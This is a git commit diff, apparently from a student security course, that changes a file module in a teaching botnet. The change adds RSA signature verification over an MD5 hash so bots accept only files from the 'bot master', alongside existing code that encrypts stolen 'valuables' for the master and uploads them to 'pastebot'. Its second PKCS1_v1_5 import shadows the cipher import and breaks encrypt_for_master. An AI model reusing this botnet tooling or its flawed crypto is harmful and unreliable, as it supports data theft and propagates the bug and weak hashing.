cbcb93e3754be30ca7c93f6885774d634c53f23d
m-sachi <melisa.sachi@student.uts.edu.au>
2016-05-30 12:27:24 +1000

    Update files.py
    + Added verification_key
    + Added verify_file
    + Renamed 'cipher' in encrypt_for_master to 'cipher_obj'

--- lib/files.py
+++ lib/files.py
@@ -2,6 +2,8 @@ import os
 
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_v1_5
+from Crypto.Signature import PKCS1_v1_5
+from Crypto.Hash import MD5
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -10,6 +12,7 @@ filestore = {}
 valuables = []
 
 # Public RSA key for encryption of data
+verification_key = b'-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAsz4MnNhElPo0lnW8paA6\n9lqLVQgdlhu0oQDrTRLY8+8zBgzlOKJoGlIzK7H/TmH2x5A6D31KBeG4UZvM6qKm\nLNlSdeDXEp1hlvwRgq1vR0d2Y8n2p03QZfrc9wxlet5U8+R3GmrYy+4GIrpUlHe6\nJLzhr2PmhX96HARFTakiyb5PpfwFIhYVk5N72iSi55PfXdib9kytRHArHNWXHF76\nISxwm23sXlMjD5tk78nvD12HrtHzQad1Jx8ScbC2a+mk7i3Zi+cpWs6MskKi0Ez2\n6XeZCRqPkdP+LQMg/ZmrfoLqDf1ffkrRjqjQ+UJGrBpkflv0aBmQPwFoV7TL1f0C\nclagCoV/ZFNmohNvSkYxZEndypLDJdKQkU/xTXyne7lUXzbiKNDSNF/EASHVNONR\nnCfBy59+E5RP2XE4r3uiu1HtDMFeU8oMqpnVkWzQEyoZjWyGXQur8FpkoRQ/mrKA\n/UxTb9KxwGXv9tssZ6gdzB9VSedLwim4MAO+PgDPq4wE/MO2ODhv7rCkomqEDIY7\nLIN1Yn8NlGXym0xdjG9M1BtaMb38L/C/eTX+Ical9oH7LML5PUa6vCnGU9gL0Dm5\nlFyNP5DwWV7fBv9sCJuwHQrEDBv3TvxaP8cYD6M4/FU5txgB9v4WUoCeF6cvEaTp\nDl/cqrGd2Dq3R0nQILIAi38CAwEAAQ==\n-----END PUBLIC KEY-----'
 encryption_key = b'-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2mzZeA2+fsjCGoTjRFuU\nivZifvfMPHOmMaT6p8lRjxLlRegd6TzYclEtADqxw5Nch4SueWeHKIq+YmZINnUA\nyLGQGZDKaara+ifySkdcjhQq0KXpOcDhTMSHwnDiuGR29snLhvex3fGYjARBZAxk\nvaSvR1EZqveDkTI68n9d5h+5HHTJq8+nIntOgIvLkjCUo5zcOTY9N2PmgV7hBsQ7\nAV0AXlIRRXFgw/3FKeF1ewKydBpCOAPD6iieY5qPw7FXyh1w7/8bKnbO/sndsq8W\nTni28TnlpIZ/Fr3jgGFQqMJhY97L/KxNumcZd5GoVy4pfmk79cn3w/aozEX8NbQ5\nVUkETUQsjAK8POBwJpRRjgseHRYui0hFTIr4gOfBJ8yyJPzEPz4mn2M2YjSDhqOL\nQrNnsLn7TUmZTEyRxcaJKDdQgTtcTzrwP6PsOKIyxO7KKfrX6fXJPOT19apK2kNS\nUDCCOH3xao9QqWUeHTnhhZiGErrQL6TVN+QIQ2jLIK+Bxe6z4Jd7dykiM0lrev0W\nW60tjvd0IKwQSwvkQoYZi7qAgZ+3Mksl17Y24huw8NVvmOFJLxCINVJop1fG7PKr\nuHCS2s04DIq5jw8icWGJYsED6Wzr8ddgmofYcYAbe7YVKrPRAZ96NducfdoSQKjI\nHXiSymmlKNflAOyD6cjnb+cCAwEAAQ==\n-----END PUBLIC KEY-----'
 ###
 
@@ -18,9 +21,9 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    key = RSA.importKey(encryption_key)
-    cipher = PKCS1_v1_5.new(key)
-    encrypted_data = cipher.encrypt(data)
+    key_obj = RSA.importKey(encryption_key)
+    cipher_obj = PKCS1_v1_5.new(key_obj)
+    encrypted_data = cipher_obj.encrypt(data)
     return encrypted_data
 
 def upload_valuables_to_pastebot(fn):
@@ -40,12 +43,27 @@ def upload_valuables_to_pastebot(fn):
 def verify_file(f):
     # Verify the file was sent by the bot master
     # TODO: For Part 2, you'll use public key crypto here
-    # Naive verification by ensuring the first line has the "passkey"
-    lines = f.split(bytes("\n", "ascii"), 1)
-    first_line = lines[0]
-    if first_line == bytes("Caesar", "ascii"):
+
+    key_obj = RSA.importKey(verification_key)
+
+    # Split the file into the signature and the contents of the file
+    lines = f.split(bytes("\n\n\n", "ascii"), 1)
+    signature = lines[0]
+    file_contents = lines[1]
+
+    # Hash the message to compress it to 128 bits before verification
+    # Hashing ensures that RSA will be able to verify/decrypt the message
+    # (limitation of RSA is that m must be less than n)
+    hashed_file = MD5.new(file_contents)
+    sig_scheme = PKCS1_v1_5.new(key_obj)
+
+    # Check if the signature is authentic
+    if sig_scheme.verify(hashed_file, signature):
+        print("The signature is authentic.")
         return True
-    return False
+    else:
+        print("The signature is fake.")
+        return False
 
 def process_file(fn, f):
     if verify_file(f):
